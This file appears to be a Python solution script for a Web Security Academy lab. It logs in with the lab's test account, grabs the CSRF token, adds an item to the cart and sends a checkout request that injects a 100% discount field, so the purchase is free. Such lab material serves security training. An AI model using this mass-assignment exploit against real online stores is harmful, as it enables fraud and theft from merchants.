import json
import requests
from bs4 import BeautifulSoup

PRODUCT_ID = 1
NEEDED_DISCOUNT = 100
quantity = 1 

LINK = "https://0a9600c8030a3b0880cf858f005d0034.web-security-academy.net"
ACCOUNT_PAGE = LINK + "/my-account"
LOGIN_LINK = LINK + "/login"
ADD_TO_CART_URL = LINK + "/cart"
API_CHECKOUT_URL = LINK + "/api/checkout"

LOGIN_DATA = {
    "username":"wiener",
    "password":"peter"
}

ADD_TO_CART_PAYLOAD = {
    "productId": PRODUCT_ID,
    "redir":"PRODUCT",
    "quantity":quantity
}

ORDERING_HEADERS = {
    "Content-Type": "text/plain;charset=UTF-8"
}

ORDERING_PAYLOAD = {"chosen_discount":{"percentage":NEEDED_DISCOUNT},"chosen_products":[{"product_id":str(PRODUCT_ID),"quantity":quantity}]}


s = requests.Session()

def main():
    res = s.get(LOGIN_LINK)
    csrf_token = BeautifulSoup(res.text,"html.parser").find("input",{"name":"csrf"})['value']

    print("Login to Account")
    LOGIN_DATA['csrf'] = csrf_token
    login = s.post(LOGIN_LINK,data=LOGIN_DATA)

    if login.status_code == 200:
        print("LOGIN SUCCESSFULLY")
    else:
        print("Damn! Are login and password is correct?")

    cookie = s.cookies.get_dict()

    print("Account page status:",s.get(ACCOUNT_PAGE).status_code)

    print("Start Attack")

    print("Adding product to cart!")
    add_to_cart = s.post(ADD_TO_CART_URL,data=ADD_TO_CART_PAYLOAD)
    print("Status:",add_to_cart.status_code)
    
    print("Start Ordering")
    res = s.post(API_CHECKOUT_URL,data=json.dumps(ORDERING_PAYLOAD),headers=ORDERING_HEADERS)
    print("Status Order:",res.status_code)

if __name__ == "__main__":
    main()
